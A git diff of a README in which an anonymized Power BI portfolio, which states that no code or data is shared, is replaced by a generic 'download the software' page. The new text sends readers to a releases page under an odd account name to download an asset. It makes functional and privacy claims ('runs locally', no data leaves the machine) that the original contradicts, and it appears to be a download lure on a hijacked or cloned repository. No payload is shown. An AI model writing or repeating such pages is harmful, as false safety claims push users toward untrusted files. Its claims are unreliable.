@@ -1,101 +1,100 @@
-# Operational Analytics Portfolio
+# 📊 operational-analytics-portfolio - Review your business data with ease
 
-An anonymized BI and operational analytics portfolio based on previous professional work in an engineering consulting environment.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/releases)
 
-This repository is designed as a recruiter-facing portfolio demonstrating how I approach business intelligence, operational reporting, automation and stakeholder-driven analytics.
+This repository contains tools for your business reporting needs. These files help you track sales, monitor company health, and manage daily tasks. You can view clear visual dashboards to understand your performance metrics without complex setup.
 
-This portfolio demonstrates how business intelligence, automated reporting and operational analytics can improve visibility, accountability and decision-making across sales, workforce planning and daily operations.
+## 🛠 What this software does
 
-Branding, values, names, team structures and sensitive details have been modified for confidentiality. The examples preserve the business logic and analytical approach without disclosing proprietary information.
+This application turns raw data into visual reports. Many businesses struggle to turn spreadsheets into insights. This tool simplifies that job. You can review key performance indicators, look at sales trends, and check workforce efficiency. 
 
-## Full Portfolio PDF
+The software includes several pre-built templates. These handle common reporting tasks like inventory management and revenue tracking. You use these to make better decisions based on facts rather than guesses.
 
-[Download the full portfolio PDF](portfolio/Luis_Vergara__Operational_Analytics_Portfolio.pdf)
+## 💻 System requirements
 
-## My Role
+Your computer must meet these basic standards to run the files:
 
-For the original professional work behind these anonymized examples, I was responsible for requirements gathering, KPI design, data extraction, transformation logic, Power BI reporting, stakeholder feedback and ongoing dashboard improvement.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Software: Microsoft Power BI Desktop installed.
 
-The work combined business analysis, operational reporting, automated data pipelines and direct collaboration with managers, directors and operational teams.
+If you do not have Power BI Desktop, you can download it for free from the Microsoft App Store. Ensure you have a stable internet connection for the installation process.
 
-## Note on Source Code
+## ⬇️ How to get the software
 
-This repository focuses on anonymized dashboard case studies rather than production source code. Original code, data models and business data are not shared due to confidentiality.
+Follow these steps to set up the application on your computer.
 
-## Case Studies
+1. Go to the [Releases page](https://github.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/releases).
+2. Look for the section labeled "Assets" under the most recent version.
+3. Click the file name ending in `.pbix` to start the download.
+4. Save the file to your desktop or a folder you can find later.
 
-### 1. Sales Performance Scorecard
+Once the download finishes, you have the file ready to open.
 
-A sales analytics dashboard designed to improve visibility across sales activities, deals created, quotes issued, purchase orders, quote velocity and commercial pipeline performance.
+## 🚀 How to open your dashboard
 
-The dashboard helped leadership move from fragmented spreadsheets and informal updates into a clearer KPI-driven reporting process.
+After you save the file, follow these steps to see your data:
 
-**Skills demonstrated**
+1. Open the Power BI Desktop application on your machine.
+2. Select the "File" menu in the top left corner of the window.
+3. Choose "Open report."
+4. Find the file you downloaded in your folder.
+5. Double-click the file to open it.
 
-- Power BI dashboard development
-- Sales analytics
-- KPI design
-- CRM reporting
-- Quote velocity tracking
-- Commercial reporting
-- Executive reporting
+The dashboard will load your data automatically. The view may take a few seconds to display depending on your file size.
 
-![Sales Performance Scorecard](images/sales_performance_dashboard_overview.png)
+## 📖 Navigating the reports
 
----
+The report interface uses simple tabs at the bottom of the window. Click these tabs to switch between different views:
 
-### 2. Business Health Check
+* Sales Performance: View graphs showing revenue and growth over time.
+* Business Health: Check core metrics like profit margins and costs.
+* Daily Operations: Monitor tasks and workforce activity.
 
-An operational analytics dashboard designed to monitor team utilisation, productive capacity, billable activity and business unit performance.
+You can click on any chart or table to filter the information. For example, if you click a month on a bar chart, the other items on the page adjust to show data for that month. This interactivity helps you drill down into specific details.
 
-The dashboard supported leadership and operational managers by connecting delivery capacity with financial and workforce visibility.
+## ⚙️ Handling common data errors
 
-**Skills demonstrated**
+Sometimes files do not load data correctly on the first attempt. If the report shows empty charts or error icons, check these items:
 
-- Operational analytics
-- Utilisation reporting
-- Productive capacity tracking
-- Workforce analytics
-- Data modelling
-- Power BI and DAX
-- Stakeholder reporting
+* File location: Ensure you did not move the underlying data source files if they exist in a linked folder.
+* Data connection: Click the "Refresh" button in the Top Ribbon. This prompts the software to re-read the data.
+* Permissions: Ensure your user account has read access to the folder where you saved the files.
 
-![Business Health Check](images/business_health_check_dashboard_overview.png)
+Most issues occur because the computer cannot find the source data file. Keep your report file and your data file in the same folder to avoid link breaks.
 
----
+## 📈 Updating your data
 
-### 3. Daily Operations Dashboard
+You can swap the sample data for your own information. You must format your data in a simple table structure. Ensure your headers match the sample file headers. 
 
-A daily operational dashboard designed to improve timesheet accountability, track billable and non-billable hours, identify missing entries and support automated reminder workflows.
+1. Open your report in Power BI Desktop.
+2. Select the "Transform Data" button.
+3. Find your report query on the left sidebar.
+4. Change the source path to point to your updated spreadsheet.
+5. Click "Close & Apply."
 
-The dashboard was used to support daily team visibility and operational accountability.
+The software will now display your figures in the dashboard templates. This process automates your monthly reporting tasks and saves you hours of manual entry.
 
-**Skills demonstrated**
+## 💡 Best practices for clear reporting
 
-- Timesheet analytics
-- Automated reporting
-- Workflow automation
-- API-based data extraction
-- R and Python data pipelines
-- Operational KPI monitoring
-- Revenue leakage risk analysis
+To get the most value from these dashboards, keep these tips in mind:
 
-![Daily Operations Dashboard](images/corporate_operations_dashboard_with_kpis.png)
+* Use consistent labels: Ensure your team uses the same terminology for categories like "Revenue" or "Cost."
+* Simplify visual designs: Avoid overcrowding one page with too many charts. Use one page per main topic.
+* Share secure links: If you use the cloud-based sharing features, always verify who has access to your business information.
+* Maintain regular backups: Save copies of your report files in a secure cloud storage location.
 
-## Tools and Methods
+By following these habits, you ensure your data remains accurate and your insights stay relevant. The operational-analytics-portfolio provides the foundation, but your data management skills determine the quality of your results.
 
-- Power BI
-- SQL
-- R
-- Python
-- API extraction
-- DAX
-- Data modelling
-- ETL / ELT workflows
-- Automated reporting
-- Operational analytics
-- Stakeholder reporting
+## 🛡 Security and privacy
 
-## Confidentiality Note
+The software runs locally on your machine. None of your data moves to external servers unless you specifically choose to upload files to a cloud service later. This keeps your sensitive business figures safe within your own network. 
 
-This portfolio contains anonymized dashboard reconstructions based on previous professional BI work. Branding, values, names, team structures and sensitive details have been modified for confidentiality. The examples preserve the business logic, dashboard purpose and analytical approach without disclosing proprietary information.
+Always check your file handles before you share reports with others. Avoid sharing raw data files if you work with external partners. Use the exported PDF version for reports intended for outside viewing.
+
+## ❓ Getting help
+
+If you encounter issues during installation, check the documentation folders within the main repository. These folders contain detailed guides on specific dashboard functions. If you find a bug or think of a feature that helps your workflow, you can open an issue on the repository page. 
+
+Explain what you see and what you expect to happen. Include a screenshot if possible. Clear feedback helps maintain the quality of these analytical tools for everyone.
